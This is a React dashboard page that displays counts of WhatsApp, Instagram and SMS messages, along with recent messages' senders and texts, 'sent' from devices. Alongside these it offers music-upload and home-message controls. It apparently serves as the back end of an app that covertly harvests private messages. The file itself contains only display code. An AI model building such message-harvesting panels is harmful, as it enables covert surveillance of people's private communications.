'use client';

import { useState, useEffect } from 'react';

interface Analytics {
  totalMessages: number;
  whatsappCount: number;
  instagramCount: number;
  smsCount: number;
  totalPhotos: number;
  totalMusic: number;
  totalUsers: number;
  activeDevices: number;
}

interface RecentMessage {
  id: string;
  appName: string;
  sender: string;
  text: string;
  timestamp: number;
  messageType: 'sent' | 'received';
}

export default function DashboardPage() {
  const [analytics, setAnalytics] = useState<Analytics | null>(null);
  const [recentMessages, setRecentMessages] = useState<RecentMessage[]>([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    fetchAnalytics();
    fetchRecentMessages();
  }, []);

  async function fetchAnalytics() {
    try {
      const response = await fetch('/api/analytics');
      const data = await response.json();
      if (data.success) {
        setAnalytics(data.analytics);
      }
    } catch (error) {
      console.error('Error fetching analytics:', error);
    } finally {
      setLoading(false);
    }
  }

  async function fetchRecentMessages() {
    try {
      const response = await fetch('/api/messages?limit=5');
      const data = await response.json();
      if (data.success) {
        setRecentMessages(data.messages);
      }
    } catch (error) {
      console.error('Error fetching recent messages:', error);
    }
  }

  function formatTimeAgo(timestamp: number): string {
    const seconds = Math.floor((Date.now() - timestamp) / 1000);
    if (seconds < 60) return `${seconds} sec ago`;
    const minutes = Math.floor(seconds / 60);
    if (minutes < 60) return `${minutes} min ago`;
    const hours = Math.floor(minutes / 60);
    if (hours < 24) return `${hours} hour${hours > 1 ? 's' : ''} ago`;
    const days = Math.floor(hours / 24);
    return `${days} day${days > 1 ? 's' : ''} ago`;
  }

  const stats = loading || !analytics ? [
    { title: 'Total Messages', value: '-', icon: <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" /></svg>, color: 'text-blue-400' },
    { title: 'WhatsApp', value: '-', icon: <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" /></svg>, color: 'text-green-400' },
    { title: 'Instagram', value: '-', icon: <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" /></svg>, color: 'text-pink-400' },
    { title: 'SMS', value: '-', icon: <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>, color: 'text-purple-400' },
  ] : [
    {
      title: 'Total Messages',
      value: (analytics.totalMessages || 0).toLocaleString(),
      icon: <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" /></svg>,
      color: 'text-blue-400',
    },
    {
      title: 'WhatsApp',
      value: (analytics.whatsappCount || 0).toLocaleString(),
      icon: <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" /></svg>,
      color: 'text-green-400',
    },
    {
      title: 'Instagram',
      value: (analytics.instagramCount || 0).toLocaleString(),
      icon: <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 9a2 2 0 012-2h.93a2 2 0 001.664-.89l.812-1.22A2 2 0 0110.07 4h3.86a2 2 0 011.664.89l.812 1.22A2 2 0 0018.07 7H19a2 2 0 012 2v9a2 2 0 01-2 2H5a2 2 0 01-2-2V9z" /><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 13a3 3 0 11-6 0 3 3 0 016 0z" /></svg>,
      color: 'text-pink-400',
    },
    {
      title: 'SMS',
      value: (analytics.smsCount || 0).toLocaleString(),
      icon: <svg className="w-8 h-8" fill="none" stroke="currentColor" viewBox="0 0 24 24"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 18h.01M8 21h8a2 2 0 002-2V5a2 2 0 00-2-2H8a2 2 0 00-2 2v14a2 2 0 002 2z" /></svg>,
      color: 'text-purple-400',
    },
  ];

  return (
    <div className="space-y-8">
      {/* Page Title */}
      <div>
        <h2 className="text-3xl font-bold text-white mb-2">Overview</h2>
        <p className="text-gray-400">Monitor your app activity and statistics</p>
      </div>

      {/* Stats Grid */}
      <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-6">
        {stats.map((stat, index) => (
          <div key={index} className="glass-card p-6 float-animation" style={{ animationDelay: `${index * 0.1}s` }}>
            <div className="flex items-center justify-between mb-4">
              <div className={stat.color}>{stat.icon}</div>
            </div>
            <h3 className="text-gray-400 text-sm mb-1">{stat.title}</h3>
            <p className="text-3xl font-bold text-white">{stat.value}</p>
          </div>
        ))}
      </div>

      {/* Recent Activity */}
      <div className="glass-card p-6">
        <div className="flex items-center justify-between mb-6">
          <h3 className="text-xl font-bold text-white">Recent Activity</h3>
        </div>

        {loading ? (
          <div className="flex items-center justify-center py-12">
            <div className="flex items-center space-x-3">
              <svg className="animate-spin h-8 w-8 text-blue-400" viewBox="0 0 24 24">
                <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4" fill="none" />
                <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z" />
              </svg>
              <span className="text-gray-400">Loading recent messages...</span>
            </div>
          </div>
        ) : recentMessages.length === 0 ? (
          <div className="text-center py-12">
            <svg className="w-16 h-16 text-gray-600 mx-auto mb-4" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M8 12h.01M12 12h.01M16 12h.01M21 12c0 4.418-4.03 8-9 8a9.863 9.863 0 01-4.255-.949L3 20l1.395-3.72C3.512 15.042 3 13.574 3 12c0-4.418 4.03-8 9-8s9 3.582 9 8z" />
            </svg>
            <p className="text-gray-400 text-lg">No recent messages</p>
            <p className="text-gray-500 text-sm mt-2">Messages will appear here once devices start sending data</p>
          </div>
        ) : (
          <div className="space-y-4">
            {recentMessages.map((message) => (
              <div key={message.id} className="glass-input p-4 rounded-lg flex items-center justify-between hover:glass-card transition-all duration-200">
                <div className="flex items-center space-x-4">
                  <div className={`w-12 h-12 rounded-full flex items-center justify-center ${
                    message.appName.toLowerCase() === 'whatsapp' ? 'bg-green-500/20 text-green-400' :
                    message.appName.toLowerCase() === 'instagram' ? 'bg-pink-500/20 text-pink-400' :
                    'bg-purple-500/20 text-purple-400'
                  }`}>
                    {message.appName[0].toUpperCase()}
                  </div>
                  <div>
                    <p className="text-white font-semibold">{message.sender}</p>
                    <p className="text-gray-400 text-sm truncate max-w-md">{message.text}</p>
                  </div>
                </div>
                <div className="text-right">
                  <p className="text-gray-400 text-sm">{formatTimeAgo(message.timestamp)}</p>
                  <span className={`text-xs px-2 py-1 rounded-full ${
                    message.messageType === 'sent' ? 'bg-blue-500/20 text-blue-400' : 'bg-green-500/20 text-green-400'
                  }`}>
                    {message.messageType}
                  </span>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>

      {/* Quick Actions */}
      <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
        <div className="glass-card p-6 hover:glow transition-all duration-300 cursor-pointer">
          <div className="w-12 h-12 rounded-lg bg-blue-500/20 flex items-center justify-center mb-4">
            <svg className="w-6 h-6 text-blue-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 4v16m8-8H4" />
            </svg>
          </div>
          <h4 className="text-white font-semibold mb-2">Add Music</h4>
          <p className="text-gray-400 text-sm">Upload new music tracks to Firebase</p>
        </div>

        <div className="glass-card p-6 hover:glow transition-all duration-300 cursor-pointer">
          <div className="w-12 h-12 rounded-lg bg-pink-500/20 flex items-center justify-center mb-4">
            <svg className="w-6 h-6 text-pink-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M11 5H6a2 2 0 00-2 2v11a2 2 0 002 2h11a2 2 0 002-2v-5m-1.414-9.414a2 2 0 112.828 2.828L11.828 15H9v-2.828l8.586-8.586z" />
            </svg>
          </div>
          <h4 className="text-white font-semibold mb-2">Edit Home Message</h4>
          <p className="text-gray-400 text-sm">Customize the home screen message</p>
        </div>

        <div className="glass-card p-6 hover:glow transition-all duration-300 cursor-pointer">
          <div className="w-12 h-12 rounded-lg bg-purple-500/20 flex items-center justify-center mb-4">
            <svg className="w-6 h-6 text-purple-400" fill="none" stroke="currentColor" viewBox="0 0 24 24">
              <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M9 19v-6a2 2 0 00-2-2H5a2 2 0 00-2 2v6a2 2 0 002 2h2a2 2 0 002-2zm0 0V9a2 2 0 012-2h2a2 2 0 012 2v10m-6 0a2 2 0 002 2h2a2 2 0 002-2m0 0V5a2 2 0 012-2h2a2 2 0 012 2v14a2 2 0 01-2 2h-2a2 2 0 01-2-2z" />
            </svg>
          </div>
          <h4 className="text-white font-semibold mb-2">View Analytics</h4>
          <p className="text-gray-400 text-sm">Check detailed usage statistics</p>
        </div>
      </div>
    </div>
  );
}
